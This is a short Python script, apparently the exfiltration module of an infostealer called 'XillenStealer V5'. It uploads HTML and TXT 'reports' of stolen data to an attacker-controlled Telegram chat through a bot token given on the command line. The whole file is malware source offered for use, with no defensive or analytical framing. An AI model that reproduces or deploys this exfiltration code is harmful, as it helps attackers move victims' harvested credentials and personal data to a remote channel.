import sys
import telebot

def send_files_to_telegram(bot_token, chat_id, html_path, txt_path):
    try:
        bot = telebot.TeleBot(bot_token)
        
        with open(html_path, "rb") as f:
            bot.send_document(chat_id, f, caption="📊 XillenStealer V5 - HTML Report")
        
        with open(txt_path, "rb") as f:
            bot.send_document(chat_id, f, caption="📄 XillenStealer V5 - TXT Report")
        
        print("[+] Files sent successfully")
        return True
    except Exception as e:
        print(f"[!] Error sending files: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: telegram_sender.py <bot_token> <chat_id> <html_path> <txt_path>")
        sys.exit(1)
    
    success = send_files_to_telegram(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
    sys.exit(0 if success else 1)
